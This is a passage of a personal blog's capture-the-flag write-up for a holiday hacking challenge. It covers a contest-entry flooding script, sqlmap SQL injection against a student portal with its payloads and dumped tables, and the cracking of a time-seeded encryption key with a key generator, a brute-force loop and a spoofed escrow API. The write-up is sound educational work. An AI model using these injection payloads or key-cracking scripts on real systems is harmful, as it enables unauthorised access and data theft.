    <span class="c1"># If we get to here, we are successful and can submit a bunch of entries till we win</span>
    <span class="n">userinfo</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;name&#39;</span><span class="p">:</span><span class="s1">&#39;Krampus Hollyfeld&#39;</span><span class="p">,</span>
        <span class="s1">&#39;email&#39;</span><span class="p">:</span><span class="n">yourREALemailAddress</span><span class="p">,</span>
        <span class="s1">&#39;age&#39;</span><span class="p">:</span><span class="mi">180</span><span class="p">,</span>
        <span class="s1">&#39;about&#39;</span><span class="p">:</span><span class="s2">&quot;Cause they&#39;re so flippin yummy!&quot;</span><span class="p">,</span>
        <span class="s1">&#39;favorites&#39;</span><span class="p">:</span><span class="s1">&#39;thickmints&#39;</span>
    <span class="p">}</span>
    <span class="c1"># If we win the once-per minute drawing, it will tell us we were emailed.</span>
    <span class="c1"># Should be no more than 200 times before we win. If more, somethings wrong.</span>
    <span class="n">entry_response</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="n">entry_count</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">while</span> <span class="n">yourREALemailAddress</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">entry_response</span> <span class="ow">and</span> <span class="n">entry_count</span> <span class="o">&lt;</span> <span class="mi">200</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Submitting lots of entries until we win the contest! Entry #</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">entry_count</span><span class="p">))</span>
        <span class="n">entry_response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">{}</span><span class="s2">api/entry&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">userinfo</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
        <span class="n">entry_count</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">entry_response</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>

<h2>NEEEXT! Student Body finding some scrap papers objective 9</h2>
<ul>
<li>Got some hints in the game talking about sqlmap. Let's play with that and learn about <a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)">SQL injections</a> :)<ul>
<li>Started by looking at the page and reading the source code. Identified two forms on two pages that looked interesting.</li>
<li>First went down a rabbit hole of the sqlmap tamper scripts.</li>
<li>Just doing this:</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="nv">token</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>validation<span class="k">)</span>
sqlmap<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;https://url?token=</span><span class="nv">$token</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span>variable
</code></pre></div>

<ul>
<li>Got sqlmap to find that elfmail in the check.php was vulnerable.</li>
<li>a curl "https://url?elfmail=me@me.com'token=$token"<ul>
<li>got a noice SQL error!</li>
</ul>
</li>
<li>tamper investigation was not wasted because</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="nv">token</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>validation<span class="k">)</span>
sqlmap<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;https://studentportal.elfu.org/application-check.php?elfmail=my%40example.com&amp;token=</span><span class="nv">$token</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span>elfmail<span class="w"> </span>--eval<span class="o">=</span><span class="s2">&quot;import requests;token=requests.get(&#39;https://studentportal.elfu.org/validator.php&#39;).text&quot;</span>
</code></pre></div>

<ul>
<li>was needed to get sqlmap to find some techniques. Presumably the token only worked for the first tests.</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">#SNIPSNIP</span>
<span class="n">Parameter</span><span class="p">:</span><span class="w"> </span><span class="n">elfmail</span><span class="w"> </span><span class="p">(</span><span class="n">GET</span><span class="p">)</span>
<span class="w">    </span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">boolean</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span>
<span class="w">    </span><span class="n">Title</span><span class="p">:</span><span class="w"> </span><span class="n">AND</span><span class="w"> </span><span class="n">boolean</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">WHERE</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">HAVING</span><span class="w"> </span><span class="n">clause</span>
<span class="w">    </span><span class="n">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">elfmail</span><span class="o">=</span><span class="n">my</span><span class="err">@</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="s1">&#39; AND 2977=2977 AND &#39;</span><span class="n">tYvj</span><span class="s1">&#39;=&#39;</span><span class="n">tYvj</span><span class="o">&amp;</span><span class="n">token</span><span class="o">=</span><span class="n">MTAwOTU4MTk3Njk2MTU3NzQ3MTgzOTEwMDk1ODE5Ny42OTY</span><span class="o">=</span><span class="n">_MTI5MjI2NDkzMDUwODgzMjMwNjYyMzI2LjI3Mg</span><span class="o">==</span>

<span class="w">    </span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">error</span><span class="o">-</span><span class="n">based</span>
<span class="w">    </span><span class="n">Title</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">5.0</span><span class="w"> </span><span class="n">AND</span><span class="w"> </span><span class="n">error</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">WHERE</span><span class="p">,</span><span class="w"> </span><span class="n">HAVING</span><span class="p">,</span><span class="w"> </span><span class="n">ORDER</span><span class="w"> </span><span class="n">BY</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">GROUP</span><span class="w"> </span><span class="n">BY</span><span class="w"> </span><span class="n">clause</span><span class="w"> </span><span class="p">(</span><span class="n">FLOOR</span><span class="p">)</span>
<span class="w">    </span><span class="n">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">elfmail</span><span class="o">=</span><span class="n">me</span><span class="err">@</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="s1">&#39; AND (SELECT 4602 FROM(SELECT COUNT(*),CONCAT(0x7176786a71,(SELECT (ELT(4602=4602,1))),0x7162626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#39;</span><span class="n">XazW</span><span class="s1">&#39;=&#39;</span><span class="n">XazW</span><span class="o">&amp;</span><span class="n">token</span><span class="o">=</span><span class="n">MTAwOTU4MTk3Njk2MTU3NzQ3MTgzOTEwMDk1ODE5Ny42OTY</span><span class="o">=</span><span class="n">_MTI5MjI2NDkzMDUwODgzMjMwNjYyMzI2LjI3Mg</span><span class="o">==</span>
</code></pre></div>

<p>Could not get the above queries to work in a curl.. maybe some escape messup. But sqlmap --users find stuff.</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span><span class="n">18:51:19</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="nl">retrieved</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;elfu&#39;</span>
<span class="o">[</span><span class="n">18:51:20</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="nl">retrieved</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;applications&#39;</span>
<span class="o">[</span><span class="n">18:51:21</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="nl">retrieved</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;elfu&#39;</span>
<span class="o">[</span><span class="n">18:51:22</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="nl">retrieved</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;krampus&#39;</span>
<span class="o">[</span><span class="n">18:51:23</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="nl">retrieved</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;elfu&#39;</span>
</code></pre></div>

<p>sqlmap had a nice --sql-shell and with that one could "select * from elfu.krampus" which got us some paths:</p>
<div class="highlight"><pre><span></span><code>select * from elfu.krampus [6]:
[*] /krampus/0f5f510e.png, 1
[*] /krampus/1cc7e121.png, 2
[*] /krampus/439f15e6.png, 3
[*] /krampus/667d6896.png, 4
[*] /krampus/adb798ca.png, 5
[*] /krampus/ba417715.png, 6
</code></pre></div>

<p>Now then that looks like an OS path, need to run a shell command.. but on a whim tried <a href="https://studentportal.elfu.org/krampus/">https://studentportal.elfu.org/krampus/</a> and yay found them there. Fired up good old GIMP and learnt about the rotate tool :P Yay, <strong>one</strong> more objective!</p>
<h2>Remaining are reversing some crypto windows executable and the ban the IPs in the firewall for the route API</h2>
<p>Crypto then. Hint is <a href="https://www.youtube.com/watch?v=obJdpKDpFBA&amp;feature=youtu.be">https://www.youtube.com/watch?v=obJdpKDpFBA&amp;feature=youtu.be</a> &gt; <a href="https://github.com/CounterHack/reversing-crypto-talk-public">https://github.com/CounterHack/reversing-crypto-talk-public</a></p>
<p>Running an encryption tells us it uses unix epoch as a seed and a hint to the challenge was " We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC. " This is from <strong>1575658800 to 1575666000</strong> . There are some super_secure_random and super_secure_srand functions found with IDA freeware. Probably they are not super. <a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptimportkey">https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptimportkey</a> for example is one in use. I wonder what the difference with --insecure is? One error talks about <a href="https://crypto.stackexchange.com/questions/62771/is-des-secure-under-cbc">DES-CBC</a> which internet says is insecure. It uses 56-bits and 8bytes. Stack of do_encrypt also says "dd 8" so yay?</p>
<div class="highlight"><pre><span></span><code><span class="mf">00000000</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="err">[</span><span class="mf">00000008</span><span class="w"> </span><span class="n">BYTES</span><span class="mf">.</span><span class="w"> </span><span class="n">COLLAPSED</span><span class="w"> </span><span class="n">UNION</span><span class="w">  </span><span class="n">_LARGE_INTEGER</span><span class="mf">.</span><span class="w"> </span><span class="n">PRESS</span><span class="w"> </span><span class="n">CTRL</span><span class="o">-</span><span class="n">NUMPAD</span><span class="o">+</span><span class="w"> </span><span class="kr">TO</span><span class="w"> </span><span class="nb">EXP</span><span class="ow">AND</span><span class="err">]</span>
<span class="mf">00000000</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="err">[</span><span class="mf">00000008</span><span class="w"> </span><span class="n">BYTES</span><span class="mf">.</span><span class="w"> </span><span class="n">COLLAPSED</span><span class="w"> </span><span class="n">STRUCT</span><span class="w"> </span><span class="err">$</span><span class="n">FAF74743FBE1C8632047CFB668F7028A</span><span class="mf">.</span><span class="w"> </span><span class="n">PRESS</span><span class="w"> </span><span class="n">CTRL</span><span class="o">-</span><span class="n">NUMPAD</span><span class="o">+</span><span class="w"> </span><span class="kr">TO</span><span class="w"> </span><span class="nb">EXP</span><span class="ow">AND</span><span class="err">]</span>
</code></pre></div>

<p>Which is used in security_init_cookie And imp__QueryPerformanceCounter. Way more than 8 bytes though.</p>
<p>While looking at these listened to the youtube talk and it said "running it at the same time generates the same key" - tried that with two identical files and it generated the same key. What about with two files without same checksum? Yep. Same. Encryption key. So next step would be to try to encrypt something for every second between <strong>1575658800 to 1575666000</strong> ? That's 7200. Which would give us 7200 keys we could try to use to decrypt the file. Is it too much? Right now I'm thinking the --insecure might help if one use the Burp suite to intercept the packages to the elfscrow api server? The time bit in the code uses time64</p>
<p>call time into eax<br>
then eax as a parameter into:<br>
call super_secure_srand<br>
there is a loop (8) and inside that it calls super_secure_random which looks complicated but by googling the numbers in decimal we find: <a href="https://rosettacode.org/wiki/Linear_congruential_generator#C">https://rosettacode.org/wiki/Linear_congruential_generator#C</a></p>
<p>which has</p>
<div class="highlight"><pre><span></span><code><span class="nv">rseed</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">214013</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2531011</span>
#<span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">disasembled</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="nv">does</span>:
<span class="nv">sar</span><span class="w">     </span><span class="nv">eax</span>,<span class="w"> </span><span class="mi">10</span><span class="nv">h</span>
<span class="nv">and</span><span class="w">     </span><span class="nv">eax</span>,<span class="w"> </span><span class="mi">7</span><span class="nv">FFFh</span>
</code></pre></div>

<p>Which is also here: http://cer.freeshell.org/renma/LibraryRandomNumber/<br>
And here I learnt that &gt;&gt; in python is the sar.</p>
<p>After goin walking thought a bit about what is the end goal here. And it is not the key, but it could be. Right now plan is to generate the secret-id, because the secret-id is what is used to decrypt with the tool, not the key. But maybe the uuid is something you only get from the escrow API server.</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>curl<span class="w"> </span>-XPOST<span class="w"> </span>http://elfscrow.elfu.org/api/store<span class="w"> </span>-d<span class="w"> </span>1234567890abcdef
0e5b05dd-e132-42aa-b699-1829d3e23e2f
$<span class="w"> </span>curl<span class="w"> </span>-XPOST<span class="w"> </span>http://elfscrow.elfu.org/api/retrieve<span class="w"> </span>-d<span class="w"> </span>0e5b05dd-e132-42aa-b699-1829d3e23e2f
1234567890abcdef
</code></pre></div>

<p>Seems it is. And the hex needs to be in lower letters. ABCDEF did not fly. UUID must be in this format: 00000000-0000-0000-0000-000000000000 it seems. Not sure about sqlmap use here. . SSH and web server is running. But SSH has been open on several previous addresses in this CTF too..</p>
<div class="highlight"><pre><span></span><code> WEBrick/1.4.2 (Ruby/2.6.3/2019-04-16) at
 elfscrow.elfu.org:443
</code></pre></div>

<p>Actually what might be doable with just the key is to: setup my own API server that just returns the key.. <em>Change the address in the binary or finally use BURP or local DNS override?</em> Still need to figure out the key :))</p>
<h2>Let's try to read the do_encrypt again</h2>
<ol>
<li>call read_file</li>
<li>set some crypto vars</li>
<li>call CryptAcquireContext</li>
<li>call generate_key<ol>
<li>key goes into eax register I think</li>
</ol>
</li>
<li>call print_hex</li>
<li>more crypto</li>
<li>call CryptImport and CryptEncrypt</li>
<li>call store_key and write_file</li>
<li>call security_check_cookie</li>
</ol>
<p>Generate_key does:</p>
<ol>
<li>call time</li>
<li>call <strong>super_secure_srand</strong>, probably with file,time and seed as args</li>
<li>loop 8 times and call <strong>super_secure_random</strong> to modify state?</li>
</ol>
<div class="highlight"><pre><span></span><code><span class="k">call</span><span class="w">    </span><span class="vm">?</span><span class="n">super_secure_random</span><span class="nb">@@YAHXZ</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">super_secure_random</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
<span class="n">movzx</span><span class="w">   </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="n">al</span>
<span class="ow">and</span><span class="w">     </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">FFh</span>
<span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">ebp+buffer</span><span class="o">]</span>
<span class="k">add</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">ebp+i</span><span class="o">]</span>
<span class="n">mov</span><span class="w">     </span><span class="o">[</span><span class="n">edx</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">cl</span>
</code></pre></div>

<p>super_secure_srand does:<br>
<em>something with seed.. really unsure</em></p>
<p>super_secure_srandom does:<br>
this is doing the rseed, sar, and</p>
<h2>The Key Writer</h2>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>


<span class="c1"># key examples</span>

<span class="c1"># dcd5ed4c2acba87e</span>
<span class="c1"># 9f32148fe8ef55a8</span>
<span class="c1"># 0d2bac4df0a12e5a</span>
<span class="c1"># fa41fb5131993bf5</span>

<span class="c1">#https://www.aldeid.com/wiki/X86-assembly/Instructions/shr</span>
<span class="c1"># like the &gt;&gt; much more than ^</span>

<span class="c1"># https://rosettacode.org/wiki/Linear_congruential_generator#Python</span>
<span class="k">def</span> <span class="nf">msvcrt_rand</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">rand</span><span class="p">():</span>
      <span class="k">nonlocal</span> <span class="n">seed</span>
      <span class="n">fixed</span> <span class="o">=</span> <span class="n">seed</span>
      <span class="n">keyarray</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
      <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="c1">#ka = (214013*seed + 2531011)</span>
        <span class="n">fixed</span> <span class="o">=</span> <span class="n">fixed</span> <span class="o">*</span> <span class="mh">0x343fd</span> <span class="o">+</span> <span class="mh">0x269ec3</span>
        <span class="n">key</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fixed</span> <span class="o">&gt;&gt;</span> <span class="mh">0x10</span> <span class="o">&amp;</span> <span class="mh">0x7ffffff</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span> <span class="c1"># &gt;&gt; sar 16 &amp; is and. We only want the last two bytes - the start look very similar..</span>
        <span class="k">if</span> <span class="s1">&#39;x&#39;</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
            <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span> <span class="c1"># because movzx</span>
        <span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="n">keyarray</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
      <span class="k">return</span><span class="p">(</span><span class="n">keyarray</span><span class="p">)</span> <span class="c1"># last two</span>
    <span class="k">return</span><span class="p">(</span><span class="n">rand</span><span class="p">())</span>

<span class="n">seed</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1575658800</span><span class="p">,</span><span class="mi">1575666001</span><span class="p">)</span>
<span class="c1"># so not off by 1                ^</span>
<span class="k">for</span> <span class="n">rseed</span> <span class="ow">in</span> <span class="n">seed</span><span class="p">:</span>
  <span class="n">two</span> <span class="o">=</span> <span class="n">msvcrt_rand</span><span class="p">(</span><span class="n">rseed</span><span class="p">)</span>
  <span class="nb">print</span><span class="p">(</span><span class="n">two</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</code></pre></div>

<p>Trying the edit hosts file. As I use WSL I learnt that for .exe files I also need to update window's hosts file, even though I run it from inside the WSL! Also the syntax is <strong>NOT</strong>:</p>
<div class="highlight"><pre><span></span><code>localhost elfscrow.elfu.org
</code></pre></div>

<p>Bunch of false positives for some reason... when I use the list of keys I generated and my API and a localhost flask API and hosts file override. Anyway, let this run and used file to stop when it found a pdf, it stopped at 4849 (or 4850th key in keys [] in my python api.py, unsure if that is sorted.. so the creation time might have been 1575663650 ( <em>Friday, December 6, 2019 8:20:50 PM</em> ) :</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>

<span class="c1"># the Bruter</span>

<span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">7200</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">  </span>./elfscrow.exe<span class="w"> </span>--decrypt<span class="w"> </span>--id<span class="o">=</span>7debfae7-3a16-41e7-b211-678f5ebdce00<span class="w"> </span>ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc<span class="w"> </span>out.pdf<span class="w"> </span>--insecure
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span>out.pdf<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">          </span><span class="nv">isitpdf</span><span class="o">=</span><span class="k">$(</span>file<span class="w"> </span>out.pdf<span class="p">|</span>grep<span class="w"> </span>-c<span class="w"> </span>PDF<span class="k">)</span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$isitpdf</span><span class="w"> </span>!<span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$isitpdf</span>
<span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;GOT IT </span><span class="nv">$i</span><span class="s2">&quot;</span>
<span class="w">            </span><span class="nb">exit</span><span class="w"> </span><span class="m">123</span>
<span class="w">          </span><span class="k">else</span>
<span class="w">            </span>mv<span class="w"> </span>-v<span class="w"> </span>out.pdf<span class="w"> </span><span class="s2">&quot;falses/</span><span class="nv">$i</span><span class="s2">.pdf&quot;</span>
<span class="w">          </span><span class="k">fi</span>
<span class="w">  </span><span class="k">fi</span>
<span class="k">done</span>
</code></pre></div>

<p>and the API.py</p>
<div class="highlight"><pre><span></span><code><span class="c1">#https://stoplight.io/blog/python-rest-api/</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">json</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">keys</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;b5ad6a321240fbec&quot;</span><span class="p">,</span> <span class="s2">&quot;7200...&quot;</span><span class="p">,</span> <span class="s2">&quot;7199&quot;</span><span class="p">,</span> <span class="s2">&quot;...&quot;</span><span class="p">]</span>
<span class="n">api</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="nd">@api</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/retrieve&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">get_companies</span><span class="p">():</span>
  <span class="c1"># store last key tested in a file</span>

  <span class="n">statefile</span> <span class="o">=</span> <span class="s2">&quot;/root/elfscrow_status&quot;</span>
  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">statefile</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">r</span><span class="p">:</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="nb">int</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">statefile</span><span class="p">,</span><span class="s2">&quot;w+&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="p">)</span>
      <span class="k">return</span><span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="p">)</span>

    <span class="n">icontent</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="n">ncontent</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Last was </span><span class="si">%s</span><span class="s2">, updating to </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">icontent</span><span class="p">,</span> <span class="n">ncontent</span><span class="p">))</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">statefile</span><span class="p">,</span><span class="s2">&quot;w+&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
      <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ncontent</span><span class="p">))</span>

  <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">keys</span><span class="p">[</span><span class="n">ncontent</span><span class="p">])</span>
  <span class="c1">#return json.dumps(companies)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">api</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</code></pre></div>

<p>Then to get the key was just a pdf2txt and the 5 word sentence in the beginning of the document!</p>
<h2>OK THE ZEEK/BRO Logs is the last one?</h2>
<p>The username was found in https://srf.elfu.org/README.md</p>
<p>Started on this earlier but stopped because I wasn't feeling it and it was a bit tedious.<br>
Plan: Make the queries programmatically. Also this time check sizes of requests maybe that's important. Also time when attacks happen could be useful?</p>
<p>let's try out <a href="https://github.com/activecm/rita">RITA</a> as indicated in a hint, also found <a href="https://github.com/idaholab/Malcolm">Malcolm</a> while looking up this tool.. could be fun. But at least RITA couldn't import the http.log :/</p>
<p>weird that the IPs in with the LFI, shellshock etc haven't posted.. maybe they posted later?</p>
<p>Wow you made it all this way? Prepare for a bit of downer! :)</p>
<p><em>In the end I ran out of time. End of new year approached and some busy times in January 2020! Turned out I got quite far with a python script, but had too many good IPs in my list I think. In the end I used a JQ solution found in a writeup that is available in the google cache, initially found by searching for the numbers used for the srand function in the elfscrow challenge.</em></p>
<p><a href="https://downloads.elfu.org/LetterOfWintryMagic.pdf">https://downloads.elfu.org/LetterOfWintryMagic.pdf</a></p>                </article>
            </aside><!-- /#featured -->
                <section id="content" class="body">
                    <h1>Other articles</h1>
                    <hr />
                    <ol id="posts-list" class="hfeed">

            <li><article class="hentry">
                <header>
                    <h1><a href="/wasthereannhlgamelastnightappspotcom-fixed-working-again.html" rel="bookmark"
                           title="Permalink to "wasthereannhlgamelastnight.appspot.com - fixed - working again!"">"wasthereannhlgamelastnight.appspot.com - fixed - working again!"</a></h1>
                </header>

                <div class="entry-content">
<footer class="post-info">
        <abbr class="published" title="2017-10-04T00:00:00+03:00">
                Published: "2017-10-04"
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/johan-guldmyr.html">Johan Guldmyr</a>
        </address>
<p>In <a href="/category/finland.html">finland</a>.</p>
<p>tags: <a href="/tag/api.html">api</a> <a href="/tag/gcloud.html">gcloud</a> <a href="/tag/google.html">google</a> <a href="/tag/json.html">json</a> <a href="/tag/nhl.html">nhl</a> <a href="/tag/python.html">python</a> <a href="/tag/rest.html">rest</a> <a href="/tag/wasthereannhlgamelastnight.html">wasthereannhlgamelastnight</a> </p>
</footer><!-- /.post-info -->                <p>With NHL 2017-2018 season coming up and I had some extra spare time I thought why not finally fix this great website again :)</p>
<p>As NHL changed the layout of their schedule page about two seasons ago - there's these days "infinite scrolling" or whatever it's called when the page only loads …</p>
                <a class="readmore" href="/wasthereannhlgamelastnightappspotcom-fixed-working-again.html">read more</a>
                </div><!-- /.entry-content -->
            </article></li>

            <li><article class="hentry">
                <header>
                    <h1><a href="/sdn-course-interview-with-google-network-lead.html" rel="bookmark"
                           title="Permalink to "SDN Course - Interview with Google Network Lead"">"SDN Course - Interview with Google Network Lead"</a></h1>
                </header>

                <div class="entry-content">
<footer class="post-info">
        <abbr class="published" title="2013-07-31T00:00:00+03:00">
                Published: "2013-07-31"
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/johan-guldmyr.html">Johan Guldmyr</a>
        </address>
<p>In <a href="/category/it.html">it</a>.</p>
<p>tags: <a href="/tag/coursera.html">coursera</a> <a href="/tag/learning.html">learning</a> <a href="/tag/linux.html">linux</a> <a href="/tag/pyretic.html">pyretic</a> <a href="/tag/python.html">python</a> <a href="/tag/resonance.html">resonance</a> <a href="/tag/sdn.html">sdn</a> <a href="/tag/software.html">software</a> <a href="/tag/defined.html">defined</a> <a href="/tag/networking.html">networking</a> <a href="/tag/studying.html">studying</a> </p>
</footer><!-- /.post-info -->                <p>This week in the <a href="https://www.coursera.org/course/sdn">SDN course</a> on coursera there were lots of examples of real use of SDN stuff, for example like the B4 WAN by Google. They got a really <em>interesting</em> and <em>cool</em> interview with the Network Lead at Google - Amin Vahdat. And! They actually put this <a href="http://www.youtube.com/watch?v=8I6YevjRFQ0" title="http://www.youtube.com/watch?v=8I6YevjRFQ0">interview up …</a></p>
                <a class="readmore" href="/sdn-course-interview-with-google-network-lead.html">read more</a>
